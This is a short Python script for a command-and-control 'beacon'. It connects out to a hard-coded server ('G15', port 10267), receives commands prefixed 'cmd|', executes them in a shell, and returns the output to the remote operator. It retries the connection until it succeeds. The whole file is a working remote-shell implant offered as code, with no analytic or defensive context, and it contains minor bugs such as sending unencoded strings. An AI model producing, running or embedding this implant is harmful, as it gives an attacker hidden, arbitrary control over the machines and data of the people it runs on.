#!/usr/bin/python3

import socket,subprocess,time,string

class Beacon:
   #Contains client side behavior and state

   __slots__ = ["sock","running","server_ip","server_port","debugging"]

   def __init__(self,server_ip,server_port):
      self.running = False
      self.server_ip = server_ip
      self.server_port = server_port
      self.debugging = True

   def connect(self):
      self.sock.connect((self.server_ip,self.server_port))

   def run_command(self,command):
      try:
         cmd = command.split(" ")
         ps = subprocess.run(cmd, shell=True, capture_output=True,check=True)
         if self.debugging == True:
            print("Sending:" ,ps.stdout)
         if ps.stdout != None and ps.stdout!= "":
            self.sock.send(ps.stdout)
         else:
            self.sock.send("SUCCESS")
      except Exception as e:
                     error_msg = f"ERROR: {str(e)}"
                     if self.debugging == True:
                        print(error_msg)
                     self.sock.send(error_msg.encode())
       
   def start(self):
      self.running = True
      self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.connect()
      while self.running:
            self.sock.settimeout(5)
            try:
               data = self.sock.recv(4096).decode()
               if not data:
                  # If no data is received, break the loop
                  break
               if self.debugging == True:
                  print("Received:",data)
               split = data.split("|")
               if split[0] == "cmd":
                  self.run_command(split[1])
               elif split[0] == "quit":
                  self.terminate()
               else:
                  self.sock.send("Unknown Error".encode())
            except socket.timeout:
                continue

   def terminate(self):
      self.running = False
      self.sock.close()

def main():
   beacon = Beacon("G15",10267)
   while True:
      try:
         beacon.start()
         break
      except:
         time.sleep(10)

main()